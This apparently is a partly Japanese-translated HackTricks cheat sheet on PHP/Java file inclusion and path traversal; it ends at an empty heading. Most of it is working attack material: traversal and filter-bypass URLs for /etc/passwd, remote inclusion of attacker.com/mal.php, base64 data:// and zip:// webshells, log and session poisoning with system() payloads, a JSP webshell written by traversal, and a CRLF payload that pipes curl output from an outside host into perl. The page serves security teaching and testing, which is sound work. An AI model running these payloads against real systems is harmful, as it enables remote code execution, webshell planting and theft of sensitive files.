# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** ファイルがリモート server から読み込まれる（ベスト: あなたがコードを書き、その server が実行する）。php ではこれはデフォルトで **無効** です（**allow_url_include**）。\
**Local File Inclusion (LFI):** sever がローカルファイルを読み込む。

この脆弱性は、ユーザーが何らかの方法で server によって読み込まれるファイルを制御できる場合に発生する。

脆弱な PHP 関数: require, require_once, include, include_once

この脆弱性を悪用するための興味深いツール: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**いくつかの \*nix LFI リストを組み合わせ、さらにパスを追加してこれを作成しました：**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

また `/` を `\`\ に変更してみてください\
また `../../../../../` を追加してみてください

/ etc /password ファイルを見つけるために複数の手法を使っているリスト（脆弱性の存在を確認するため）は [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) にあります

### **Windows**

異なるワードリストのマージ：


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

また `/` を `\`\ に変更してみてください\
`C:/` を削除して `../../../../../` を追加してみてください

/boot.ini ファイルを見つけるために複数の手法を使っているリスト（脆弱性の存在を確認するため）は [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) にあります

### **OS X**

Linux の LFI リストを参照してください。

## Basic LFI and bypasses

以下の例はすべて Local File Inclusion 向けですが、Remote File Inclusion にも適用できます (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences が非再帰的に削除される
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

提供された文字列の末尾に追加される余分な文字をBypassする (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
これは **PHP 5.4 以降で修正されています**

### **エンコーディング**

非標準のエンコーディング（double URL encode など）を使用できます:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 既存のフォルダから

もしかすると back-end がフォルダのパスをチェックしている:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### サーバー上のファイルシステムディレクトリの探索

サーバーのファイルシステムは、特定の手法を用いて再帰的に探索し、ファイルだけでなくディレクトリを特定できます。このプロセスでは、ディレクトリの深さを把握し、特定のフォルダの存在を確認します。以下はその詳細な方法です：

1. **ディレクトリの深さを特定する:** 成功裏に `/etc/passwd` を取得することで、現在のディレクトリの深さを特定します（サーバーが Linux ベースの場合に適用）。以下は深さが三であることを示す例のURL構造です：
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **フォルダを調査する:** URLに疑わしいフォルダ名（例：`private`）を追加してから、`/etc/passwd` に戻ってアクセスします。追加のディレクトリ階層があるため、depthを1つ増やす必要があります:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **結果の解釈:** サーバーの応答によりフォルダが存在するかどうかがわかります:
- **Error / No Output:** 指定された場所に `private` フォルダが存在しない可能性が高いです。
- **Contents of `/etc/passwd`:** `private` フォルダの存在が確認されます。
4. **Recursive Exploration:** 発見したフォルダは、同じ手法または従来の Local File Inclusion (LFI) 手法を使ってサブディレクトリやファイルをさらに調査できます。

ファイルシステム内の別の場所にあるディレクトリを探索するには、payload を適宜調整してください。例えば、カレントディレクトリが深さ3にあると仮定して、`/var/www/` に `private` ディレクトリがあるか確認するには:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncationは、ウェブアプリケーションのファイルパスを操作するために用いられる手法です。通常、ファイルパスの末尾に追加の文字を付け加えるセキュリティ対策をバイパスして、制限されたファイルにアクセスするために使われます。目的は、セキュリティ対策によって変更されたとしても、依然として目的のファイルを指すファイルパスを作成することです。

In PHPでは、ファイルシステムの性質上、ファイルパスのさまざまな表現が同等と見なされることがあります。例えば：

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- 末尾の6文字が `passwd` の場合、末尾に `/` を追加して `passwd/` にしても対象ファイルは変わりません。
- 同様に、ファイルパスに `.php` が付いている場合（例：`shellcode.php`）、末尾に `/.` を追加してもアクセスされるファイルは変わりません。

以下の例は、機密情報（ユーザーアカウント情報）を含む一般的なターゲットである `/etc/passwd` にアクセスするために path truncation を利用する方法を示しています：
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In these scenarios, the number of traversals needed might be around 2027, but this number can vary based on the server's configuration.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) と追加の dot segments や文字を組み合わせることで、ファイルシステムを移動し、サーバーによって付加された文字列を事実上無視できます。
- **Determining the Required Number of Traversals**: 試行錯誤により、root directory まで、そして `/etc/passwd` へ辿るために必要な正確な `../` シーケンスの数を見つけることができ、`.php` のような付加文字列を無効化しつつ目的のパス（`/etc/passwd`）を維持できます。
- **Starting with a Fake Directory**: パスを非存在ディレクトリ（例: `a/`）で始めるのは一般的な手法です。このテクニックは予防措置として、またはサーバーの path parsing ロジックの要件を満たすために使われます。

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

phpでは、デフォルトで無効になっています。これは **`allow_url_include`** が **Off** になっているためです。動作させるには **On** にする必要があり、その場合、サーバー上の PHP ファイルを include して RCE を得ることができます:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
もし何らかの理由で **`allow_url_include`** が **On** になっているが、PHP が外部ウェブページへのアクセスを **filtering** している場合、[この投稿](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) によれば、例えば base64 を使った data プロトコルで b64 PHP コードをデコードして RCE を得ることができます:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 前のコードでは、末尾の `+.txt` は attacker が `.txt` で終わる文字列を必要としていたため追加されました。したがって文字列はそれで終わり、b64 デコード後その部分はただのゴミを返し、本当の PHP コードがインクルードされ（したがって実行され）ます。

別の例 **not using the `php://` protocol** は次の通りです:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python のルート要素

Pythonでは、次のようなコードの場合:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ユーザーが **absolute path** を **`file_name`** に渡した場合、**以前のパスは単に削除されます**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
これは [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join) による意図された動作です:

> コンポーネントが絶対パスである場合、以前のすべてのコンポーネントは破棄され、結合は絶対パスのコンポーネントから継続されます。

## Java ディレクトリ一覧

JavaでPath Traversalがあり、ファイルの代わりに**ディレクトリを要求すると**、**ディレクトリの一覧が返される**ようです。他の言語では発生しないようです（私の知る限り）。

## トップ25のパラメータ

local file inclusion (LFI) 脆弱性の影響を受ける可能性があるトップ25のパラメータのリストは以下の通りです（出典: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI — PHP ラッパーとプロトコルの利用

### php://filter

PHP filters は、データが読み込まれたり書き込まれたりする前に、基本的な **データに対する変更操作** を行うことを可能にします。フィルターは5つのカテゴリに分類されます:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: データからタグを除去します（"<" と ">" の間のすべて）
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 別のエンコーディングに変換します（`convert.iconv.<input_enc>.<output_enc>`）。サポートされている**すべてのエンコーディングの一覧**を得るにはコンソールで次を実行します: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: コンテンツを圧縮します（大量の情報を exfiltrating する場合に有用）
- `zlib.inflate`: データを解凍します
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : 非推奨
- `mdecrypt.*` : 非推奨
- Other Filters
- PHP で `var_dump(stream_get_filters());` を実行すると、いくつかの**予期しないフィルター**が見つかります:
- `consumed`
- `dechunk`: HTTP chunked encoding を解除します
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> 「php://filter」部分は大文字小文字を区別しません

### 任意のファイルを読み取るために php filters を oracle として使用する

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) では、サーバーから出力が返されない状態でローカルファイルを読み取る手法が提案されています。この手法は **boolean exfiltration of the file (char by char) using php filters** を oracle として用いることに基づいています。これは、php filters を使ってテキストを十分に大きくし、php に例外を発生させることができるためです。

元の記事には手法の詳細な説明がありますが、ここでは簡単に要約します:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- これにより、先頭文字が正しく推測された場合に php が **error** を引き起こすほど巨大なテキストが生成される。
- フィルタ **dechunk** は **先頭文字が16進数でない場合、すべてを削除する** ため、先頭文字が16進数かどうかを判定できる。
- これと前述の手法（および推測した文字に応じた他のフィルタ）を組み合わせることで、十分な変換を行ったときに先頭文字が16進数でなくなるタイミングを見て、テキストの先頭の文字を推測できる。もし16進数であれば dechunk は削除せず、初期のボムにより php がエラーになるからである。
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- 先頭で **rot13** のような他の変換を使うことで、n, o, p, q, r のような他の文字を leak することが可能（また他の codecs を使って別の文字を16進数の範囲へ移動させることもできる）。
- 先頭文字が数字の場合は base64 エンコードして、数字を leak するために最初の2文字を leak する必要がある。
- 最後の問題は **最初の文字以上をどのように leak するか** である。**convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** のような順序を入れ替えるフィルタを使うことで、文字の順序を変更してテキストの別の文字を先頭に持ってくることが可能となる。
- さらにデータを取得するためのアイデアは、先頭に **2バイトのゴミデータを生成する**（**convert.iconv.UTF16.UTF16** を使用）、次に **UCS-4LE** を適用してそれを次の2バイトと pivot させ、ゴミデータに達するまでデータを削除する（これにより初期テキストの最初の2バイトが削除される）。これを必要なビットを leak するまで繰り返す。

投稿ではこの処理を自動化するツールも公開されています: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
また、**php://stdin, php://stdout and php://stderr** を使用して、それぞれ **file descriptors 0, 1 and 2** にアクセスできます（攻撃でどのように役立つかは不明です）

### zip:// and rar://

PHPShell を含む Zip または Rar ファイルをアップロードしてアクセスします.\
rar protocol を悪用できるようにするには、**明示的に有効化する必要があります**。
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Note that this protocol is restricted by php configurations **`allow_url_open`** and **`allow_url_include`**

### expect://

Expect を有効にする必要があります。次のようにしてコードを実行できます:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POSTパラメータにpayloadを指定してください:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar` ファイルは、Webアプリケーションがファイル読み込みに `include` のような関数を使用している場合に、PHPコードを実行するために利用できます。以下のPHPコードスニペットは `.phar` ファイルの作成方法を示しています：
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` ファイルをコンパイルするには、次のコマンドを実行してください:
```bash
php --define phar.readonly=0 create_path.php
```
実行すると `test.phar` という名前のファイルが作成され、これを利用して Local File Inclusion (LFI) の脆弱性を悪用できる可能性があります。

LFI が PHP コードを実行せずにファイルを読み取るだけの場合（`file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, `filesize()` などを通じて）、`phar` プロトコルを使用したファイル読み取りに関連するデシリアライズ脆弱性を悪用できる可能性があります。

`.phar` ファイルの文脈でデシリアライズ脆弱性を悪用する方法の詳細は、以下のドキュメントを参照してください:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

PHP がサポートする php filters を利用できる任意のファイル読み取りを悪用して RCE を得ることが可能でした。詳細な説明は [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
ごく簡単な要約：PHP ヒープの **3 byte overflow** を悪用して特定サイズの free chunks のチェーンを **alter** し、任意のアドレスに **write anything** できるようにしたため、`system` を呼ぶフックが追加されました。\
さらに多くの php filters を悪用して特定サイズのチャンクを alloc することが可能でした。

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — メモリまたは一時ファイルに書き込む（file inclusion attack においてこれがどのように有用になるかは不明）
- [file://](https://www.php.net/manual/en/wrappers.file.php) — ローカルファイルシステムへアクセス
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL へアクセス
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL へアクセス
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 圧縮ストリーム
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — パターンに一致するパス名を見つける（出力可能な内容を返さないため、ここではあまり有用ではない）
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — オーディオストリーム（任意ファイル読み取りには役に立たない）

## LFI via PHP's 'assert'

Local File Inclusion (LFI) のリスクは、文字列内のコードを実行できる 'assert' 関数を扱う場合に特に高くなります。これは、".." のような directory traversal 文字を含む入力をチェックしているが適切にサニタイズしていない場合に特に問題になります。

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
これはtraversalを阻止することを目的としていますが、意図せずcode injectionのベクターを作り出してしまいます。reading file contentsを行うためにこれを悪用するには、an attackerは次のように使用できます:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
同様に、任意のシステムコマンドを実行するには、次のようなものを使うことが考えられます:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> この手法は、**file path** を **control** できる **PHP function** がファイルへアクセスするが（例: 単純な **`file()`** の呼び出しのように）ファイルの内容が表示されないケースに関連します。

In [**この素晴らしい投稿**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

要約すると、この手法では **"UCS-4LE" encoding** を使い、ファイルの内容を非常に**大きく**して、当該ファイルを開く **PHP function** が **error** を起こすようにします。

その後、最初の文字を leak するためにフィルタ **`dechunk`** を **base64** や **rot13** と組み合わせて使用し、最終的にフィルタ **convert.iconv.UCS-4.UCS-4LE** と **convert.iconv.UTF16.UTF-16BE** を使って先頭に他の文字を配置し、それらを leak します。

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

技術的な詳細は前述の投稿を参照してください！

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

サーバー側のコードがアップロード/取り込みファイルの宛先パスをユーザ制御のデータ（例: filename や URL）で組み立て、正規化や検証を行わない場合、`..` セグメントや絶対パスによって意図したディレクトリを抜け出し、任意のファイル書き込みを引き起こす可能性があります。payload を web-exposed なディレクトリに置ければ、通常は webshell を置くことで認証不要の RCE を得られます。

典型的な exploitation ワークフロー:
- パス/ファイル名を受け取り、ディスクにコンテンツを書き込むエンドポイントやバックグラウンドワーカー（例: メッセージ駆動の取り込み、XML/JSON コマンドハンドラ、ZIP 展開処理など）で書き込みプリミティブを特定する。
- web-exposed なディレクトリを特定する。一般的な例:
  - Apache/PHP: `/var/www/html/`
  - Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
  - IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- 意図したストレージディレクトリを抜けて webroot に到達する traversal パスを作成し、webshell のコンテンツを含める。
- ドロップした payload にブラウザでアクセスしてコマンドを実行する。

Notes:
- 書き込みを行う脆弱なサービスは非 HTTP ポートで待ち受けている場合があります（例: TCP 4004 の JMF XML リスナー）。メインの web ポータル（別ポート）が後であなたの payload を配信します。
- Java スタックでは、これらのファイル書き込みは単純な `File`/`Paths` の連結で実装されていることが多く、正規化や allow-listing の欠如が根本的な脆弱性です。

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
このクラスのバグを防ぐハードニング:
- パスを正規化し、許可リストに登録されたベースディレクトリの配下であることを確認する。
- `..`、絶対ルート、またはドライブレターを含むパスは拒否し、生成されたファイル名を優先する。
- 書き込み処理を低権限アカウントで実行し、書き込み用ディレクトリを公開ルートから分離する。

## Remote File Inclusion

前述の通り、[**follow this link**](#remote-file-inclusion)。

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> 注意: シェルに **double quotes** を使うと **simple quotes** の代わりに、ダブルクオートが文字列 "_**quote;**_" に置き換えられ、**PHP はエラーを投げ**て **それ以外は何も実行されません**。
>
> また、ペイロードを**正しく書き込む**ようにしてください。でないとログファイルを読み込むたびに PHP がエラーになり、二度目のチャンスはありません。

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### メール経由

**Send a mail** を内部アカウント (user@localhost) に送り、`<?php echo system($_REQUEST["cmd"]); ?>` のような PHP ペイロードを含め、ユーザーのメールを **`/var/mail/<USERNAME>`** または **`/var/spool/mail/<USERNAME>`** のようなパスで include してみる。

### /proc/*/fd/* 経由

1. 多数のシェルをアップロードする（例：100）
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) を include する。$PID = プロセスの PID（ブルートフォース可能）、$FD はファイルディスクリプタ（これもブルートフォース可能）

### /proc/self/environ 経由

ログファイルと同様に、ペイロードを User-Agent に入れて送信すると /proc/self/environ ファイル内に反映される。
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### アップロード経由

ファイルをアップロードできる場合は、シェルのペイロードをそのファイルに注入してください（例： `<?php system($_GET['c']); ?>` ）。
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ファイルを可読な状態に保つため、画像/ドキュメント/pdf のメタデータに注入するのが最良です

### ZIPファイルアップロード経由

圧縮されたPHP shellを含むZIPファイルをアップロードしてアクセス：
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions 経由

ウェブサイトが PHP Session (PHPSESSID) を使用しているか確認する
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHPでは、これらのセッションは _/var/lib/php5/sess\\_\[PHPSESSID]\_ ファイルに保存されます
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Cookie を `<?php system('cat /etc/passwd');?>` に設定してください
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFIを使ってPHP session fileを含める
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh経由

sshが有効な場合、どのユーザが使われているかを確認する（/proc/self/status & /etc/passwd）し、**\<HOME>/.ssh/id_rsa** にアクセスを試みる。

### **経由** **vsftpd** _**ログ**_

The logs for the FTP server vsftpd are located at _**/var/log/vsftpd.log**_. In the scenario where a Local File Inclusion (LFI) vulnerability exists, and access to an exposed vsftpd server is possible, the following steps can be considered:

1. ログイン時にユーザー名フィールドに PHP ペイロードを注入する。
2. 注入後、LFI を利用して _**/var/log/vsftpd.log**_ からサーバログを取得する。

### php base64 filter経由（base64を使用）

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64.You can use that to bypass the file extension check: if you supply base64 that ends with ".php", and it would just ignore the "." and append "php" to the base64. Here is an example payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters を使って（ファイル不要）

この [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) は、**php filters を使って任意のコンテンツを生成して出力する**方法を説明しています。つまり、ファイルに書き込むことなく include のために**任意の php code を生成**できる、ということです。


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault を使って

**Upload** したファイルは `/tmp` に **temporary** として保存され、**同一リクエスト内**で **segmentation fault** を発生させると、**一時ファイルは削除されない** ため探すことができます。


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx の一時ファイル保存を介して

もし **Local File Inclusion** を見つけ、**Nginx** が PHP の前段で動作している場合、以下の手法で RCE を得られるかもしれません：


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS を使って

もし **Local File Inclusion** を見つけたが **セッションを持っていない**、そして `session.auto_start` が `Off` の場合でも、**multipart POST** データに **`PHP_SESSION_UPLOAD_PROGRESS`** を含めると、PHP が **セッションを有効化** します。これを悪用して RCE を得ることができます：


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows の一時ファイルアップロードを使って

もし **Local File Inclusion** を見つけ、サーバが **Windows** 上で動作していれば RCE を得られる可能性があります：


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

次のリクエストは `/tmp/hello.php` を作成し、その内容を `<?=phpinfo()?>` にします：
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
以下は CRLF vuln を悪用して RCE を取得する例です (from [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### 経由 phpinfo() (file_uploads = on)

